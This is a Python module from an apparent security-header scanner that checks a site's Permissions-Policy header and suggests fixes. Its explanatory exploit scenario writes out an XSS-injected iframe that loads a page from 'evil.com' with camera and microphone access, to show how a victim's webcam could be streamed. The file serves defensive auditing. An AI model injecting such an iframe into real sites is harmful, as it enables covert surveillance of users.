"""Permissions-Policy checker."""

from __future__ import annotations

from ..models import FindingStatus, HeaderFinding, Severity
from .base import BaseHeaderChecker

# High-sensitivity features — worth explicitly disabling unless needed
_SENSITIVE_FEATURES = {
    "camera", "microphone", "geolocation", "payment",
    "usb", "battery", "ambient-light-sensor", "accelerometer",
    "gyroscope", "magnetometer",
}


class PermissionsPolicyChecker(BaseHeaderChecker):
    """
    Permissions-Policy (formerly Feature-Policy) lets you control
    which browser APIs/features are available to your page and
    any embedded iframes.
    """

    header_name = "permissions-policy"
    max_penalty = 10
    bonus = 0

    def check(self, headers: dict[str, str]) -> HeaderFinding:
        value = self._get(headers)
        # Also check the legacy Feature-Policy header
        feature_policy = self._get(headers, "feature-policy")

        if value is None and feature_policy is None:
            return HeaderFinding(
                header="Permissions-Policy",
                status=FindingStatus.MISSING,
                severity=Severity.MEDIUM,
                score_impact=-self.max_penalty,
                title="Permissions-Policy is missing",
                description=(
                    "Without Permissions-Policy, your page (and any third-party iframes "
                    "it embeds) can request access to the camera, microphone, geolocation, "
                    "and other sensitive browser APIs. An attacker who injects a malicious "
                    "iframe could silently access these features."
                ),
                recommendation=(
                    "Disable features you don't use:\n\n"
                    "  Permissions-Policy: camera=(), microphone=(), geolocation=(), "
                    "payment=(), usb=()\n\n"
                    "Allow only for self when you need them:\n\n"
                    "  Permissions-Policy: geolocation=(self)"
                ),
                references=[
                    "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy",
                    "https://w3c.github.io/webappsec-permissions-policy/",
                ],
                exploit_scenario=(
                    "XSS + no Permissions-Policy → silent surveillance:\n\n"
                    "1. Attacker finds an XSS vector on your page\n"
                    "2. Injects an iframe pointing to their server:\n"
                    "     <iframe src='https://evil.com/spy.html' allow='camera;microphone'></iframe>\n"
                    "3. Without Permissions-Policy restricting camera/microphone, the page\n"
                    "   honours the iframe's 'allow' attribute\n"
                    "4. The malicious iframe prompts for camera/microphone access\n"
                    "5. If the user has previously granted these to the top-level origin,\n"
                    "   browser may auto-allow → attacker streams victim's webcam\n\n"
                    "Even without XSS: third-party ad iframes you embed can request\n"
                    "geolocation, payment, and sensor APIs unless you restrict them."
                ),
                exploit_references=[
                    "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy",
                    "https://www.w3.org/TR/permissions-policy-1/",
                    "https://owasp.org/www-project-secure-headers/",
                    "https://portswigger.net/web-security/cross-site-scripting",
                ],
            )

        effective_value = value or feature_policy or ""
        is_legacy = value is None and feature_policy is not None

        # Find sensitive features that are explicitly allowed (not denied)
        allowed_sensitive = _find_allowed_sensitive(effective_value)

        description = (
            f"{'Feature-Policy (legacy)' if is_legacy else 'Permissions-Policy'} is configured."
        )

        recommendation = None
        status = FindingStatus.PRESENT
        score_impact = 0

        if is_legacy:
            status = FindingStatus.WARNING
            score_impact = -5
            description += (
                " Note: Feature-Policy is deprecated — rename it to Permissions-Policy "
                "and update the syntax."
            )
            recommendation = (
                "Replace Feature-Policy with Permissions-Policy. The syntax changed:\n\n"
                "  Old: Feature-Policy: camera 'none'\n"
                "  New: Permissions-Policy: camera=()\n"
            )

        if allowed_sensitive:
            features_str = ", ".join(sorted(allowed_sensitive))
            description += (
                f" Warning: sensitive feature(s) appear to be enabled without restriction: {features_str}."
            )
            score_impact = min(score_impact, -3)

        return HeaderFinding(
            header="Permissions-Policy",
            status=status,
            severity=Severity.MEDIUM,
            score_impact=score_impact,
            title=(
                "Feature-Policy (legacy) set — migrate to Permissions-Policy"
                if is_legacy
                else "Permissions-Policy is configured"
            ),
            description=description,
            current_value=effective_value,
            recommendation=recommendation,
            references=[
                "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy"
            ],
        )


def _find_allowed_sensitive(value: str) -> set[str]:
    """Return sensitive feature names that are not explicitly disabled."""
    found: set[str] = set()
    for directive in value.replace(",", ";").split(";"):
        directive = directive.strip()
        if not directive:
            continue
        # Permissions-Policy syntax: feature=() or feature=(self) or feature=*
        parts = directive.replace("=", " ").split()
        if not parts:
            continue
        feature = parts[0].lower().lstrip("*")
        if feature not in _SENSITIVE_FEATURES:
            continue
        rest = " ".join(parts[1:]).strip()
        # Explicitly disabled: feature=() → empty allowlist
        if rest in {"()", "none", "'none'", ""}:
            continue
        # Wildcard or explicit self/origin → it's allowed
        found.add(feature)
    return found
